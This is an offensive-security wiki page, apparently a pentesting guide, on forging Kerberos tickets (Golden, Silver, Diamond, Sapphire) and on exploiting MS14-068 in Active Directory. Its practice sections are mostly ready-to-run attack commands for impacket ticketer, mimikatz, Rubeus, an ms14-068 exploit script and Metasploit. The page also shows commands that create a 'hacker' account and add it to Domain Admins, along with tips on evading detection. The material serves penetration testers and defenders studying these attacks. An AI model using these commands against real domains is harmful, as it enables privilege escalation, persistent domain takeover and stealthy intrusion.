---
description: MITRE ATT&CK™ Sub-techniques T1558.001 and T1558.002
---

# Forged tickets

## Theory

Silver, Golden and Diamond tickets are forged or modified Kerberos tickets that can be used with [pass-the-ticket](ptt.md) to access services in an Active Directory domain.

<details>

<summary>Glossary</summary>

**PAC (Privileged Authentication Certificate)**: a special set of data contained in the ticket (TGT or Service Ticket) that give information about the requesting user (username, groups, UserAccountControl, etc.).&#x20;

**Long-term key**: the long-term key of an account refers to its NT hash (when the RC4 etype is not disabled in the domain) or another Kerberos key (DES, AES128, AES256).

</details>

* **Silver ticket**: the long-term key of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](ptt.md) to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.
* **Golden ticket**: the long-term key of the `krbtgt` account can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with [Pass-the-ticket](ptt.md) to access any resource within the AD domain. The `krbtgt`'s key is used to encrypt the PAC. In a Golden Ticket scenario, an attacker that has knowledge of the `krbtgt` long-term key, will usually forge a PAC indicating that the user belongs to privileged groups. This PAC will be embedded in a forged TGT. The TGT will be used to request Service Tickets than will then feature the PAC presented in the TGT, hence granting lots of access to the attacker.
* **Diamond ticket**: Golden and Silver tickets can usually be detected by probes that monitor the service ticket requests (`KRB_TGS_REQ`) that have no corresponding TGT requests (`KRB_AS_REQ`). Those types of tickets also feature forged PACs that sometimes fail at mimicking real ones, thus increasing their detection rates. Diamond tickets can be a useful alternative in the way they simply request a normal ticket, decrypt the PAC, modify it, recalculate the signatures and encrypt it again. It requires knowledge of the target service long-term key (can be the `krbtgt` for a TGT, or a target service for a Service Ticket).
* **Sapphire ticket**: Sapphire tickets are similar to Diamond tickets in the way the ticket is not forged, but instead based on a legitimate one obtained after a request. The difference lays in how the PAC is modified. The Diamond ticket approach modifies the legitimate PAC to add some privileged groups (or replace it with a fully-forged one). In the Sapphire ticket approach, the PAC of another powerful user is obtained through an [S4U2self+u2u](./#s4u2self-+-u2u) trick. This PAC then replaces the one featured in the legitimate ticket. The resulting ticket is an assembly of legitimate elements, and follows a standard ticket request, which makes it then most difficult silver/golden ticket variant to detect.

The **Bronze bit** vulnerability (CVE-2020-17049) introduced the possibility of forwarding service tickets when it shouldn't normally be possible (protected users, unconstrained delegation, constrained delegation configured with protocol transition).

![](../../../.gitbook/assets/Kerberos\_delegation.png)

## Practice

The following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](ptt.md).

{% hint style="info" %}
When forging tickets, before November 2021 updates, the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.
{% endhint %}

### Golden tickets

In order to craft a golden ticket, testers need to find the `krbtgt`'s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](../credentials/dumping/dcsync.md). Because of this, golden tickets only allow lateral movement and not privilege escalation.

{% hint style="info" %}
Microsoft now uses AES 256 bits by default. Using this encryption algorithm (instead of giving the NThash) will be stealthier.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used for this attack.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

{% hint style="success" %}
For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-kerberos) forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights).&#x20;

In these situations, testers can specify all the groups ids when creating the ticket. However, deny ACEs could actually prevent this from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id. This solution can also be reall inconvenient in domains that have lots of groups.&#x20;

Another solution to this is to look for a specific user with appropriate rights to impersonate and use [GoldenCopy](https://github.com/Dramelac/GoldenCopy) to generate a command that allows to forge a ticket with specific values corresponding to the target user (sid, group ids, etc.). The values are gathered from a neo4j database.
{% endhint %}

![Using GoldenCopy for specific user impersonation](<../../../.gitbook/assets/image (9).png>)

### Silver tickets

In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by [capturing an NTLM response](../ntlm/capture.md) (preferably NTLMv1) and [cracking](../credentials/cracking.md) it, by [dumping LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md), by doing a [DCSync](../credentials/dumping/dcsync.md), etc.

_"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." (_[_adsecurity.org_](https://adsecurity.org/?p=2011)_)_

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) can create silver tickets.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
```

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to generate a silver ticket. Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

{% hint style="info" %}
A great, stealthier, alternative is to [abuse S4U2self](delegations/s4u2self-abuse.md) in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation instead of forging everything.
{% endhint %}

### Diamond tickets

Since Golden and Silver tickets are fully forged are not preceded by legitimate TGT (`KRB_AS_REQ`) or Service Ticket requests (`KRB_TGS_REQ`), detection rates are quite high. Diamond tickets are an alternative to obtaining similar tickets in a stealthier way.

In this scenario, an attacker that has knowledge of the service long-term key (`krbtgt` keys in case of a TGT, service account keys of Service Tickets) can request a legitimate ticket, decrypt the PAC, modify it, recalculate the signatures and encrypt the ticket again. This technique allows to produce a PAC that is highly similar to a legitimate one and also produces legitimate requests.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) (Python) script can be used for such purposes.

In its actual form (as of September 9th, 2022), the script doesn't modify the PAC in the ticket obtained but instead fully replaces it with a full-forged one. This is not the most stealthy approach as the forged PAC could embed wrong information. Testers are advised to opt for the sapphire ticket approach. On top of that, if there are some structure in the PAC that Impacket can't handle, those structures will be missing in the newly forged PAC.

{% code overflow="wrap" %}
```bash
ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for such purposes since [PR#136](https://github.com/GhostPack/Rubeus/pull/136).

{% code overflow="wrap" %}
```batch
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Sapphire tickets

Since Diamond tickets modify PACs on-the-fly to include arbitrary group IDs, chances are some detection software are (of will be) able to detect discrepancies between a PAC's values and actual AD relationships (e.g. a PAC indicates a user belongs to some groups when in fact it doesn't).&#x20;

Sapphire tickets are an alternative to obtaining similar tickets in a stealthier way, by including a legitimate powerful user's PAC in the ticket. There will be no discrepency anymore between what's in the PAC and what's in Active Directory.

The powerful user's PAC can be obtained through an [S4U2self+u2u](./) trick.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) (Python) script can be used for such purposes with the `-impersonate` argument.

_As of September 25th, 2022, this feature is in a pull request (_[_#1411_](https://github.com/SecureAuthCorp/impacket/pull/1411)_) awaiting to be merged._

The arguments used to customize the PAC will be ignored (`-groups`, `-user-id`, `-extra-sid`,`-duration`), the required domain SID (`-domain-sid`) as well as the username supplied in the positional argument (`baduser` in this case). All these information will be kept as-is from the PAC obtained beforehand using the [S4U2self+u2u](./) trick.

{% code overflow="wrap" %}
```bash
ticketer.py -request -impersonate 'domainadmin' -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
_At the time of writing this recipe, September 25th, 2022, no equivalent exists for Windows systems._
{% endtab %}
{% endtabs %}

### MS14-068 (CVE-2014-6324)

This vulnerability allows attackers to forge a TGT with unlimited power (i.e. with a modified PAC stating the user is a member of privileged groups). This attack is similar to the [golden ticket](forged-tickets.md#golden-ticket), however, it doesn't require the attacker to know the `krbtgt`. This attack is a really powerful privilege escalation technique. However, it will not work on patched domain controllers.

{% tabs %}
{% tab title="UNIX-like" %}
This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14-068](https://github.com/mubix/pykek/blob/master/ms14-068.py) Python script. The script can carry out the attack with a cleartext password or with [pass-the-hash](../ntlm/pth.md).

Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60)` when trying to use the generated `.ccache` ticket mean the target is patched.

In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed.&#x20;

A TGT can then be obtained with one of the following commands.

```bash
# with a plaintext password
ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'

# with pass-the-hash
ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
```

Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with [pass-the-ticket](ptt.md). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python).

```bash
getST.py -k -no-pass -spn 'any_valid_spn' $DOMAIN_FQDN/$USER
```

{% hint style="warning" %}
In some scenarios, I personally have had trouble using the `.ccache` ticket on UNIX-like systems. What I did was [convert it](ptt.md#practice) to `.kirbi`, switch to a Windows system, inject the ticket with mimikatz's `kerberos:ptt` command, and then create a new user and add it to the domain admins group.

```bash
net user "hacker" "132Pentest!!!" /domain /add
net group "Domain Admins" /domain /add
```
{% endhint %}

Metasploit Framework can also be useful in the sense that it prints valuable error information.

```bash
msf6 > use admin/kerberos/ms14_068_kerberos_checksum
```
{% endtab %}

{% tab title="🛠️ Windows" %}
:tools: TODO : kekeo
{% endtab %}
{% endtabs %}

## References

{% embed url="https://en.hackndo.com/kerberos-silver-golden-tickets/" %}

{% embed url="https://adsecurity.org/?p=2011" %}

{% embed url="https://adsecurity.org/?p=483" %}

{% embed url="https://en.hackndo.com/kerberos" %}

{% embed url="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/" %}

{% embed url="https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/" %}

{% embed url="https://github.com/Dramelac/GoldenCopy" %}

{% embed url="https://ruuand.github.io/MS14-068/" %}

{% embed url="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/" %}
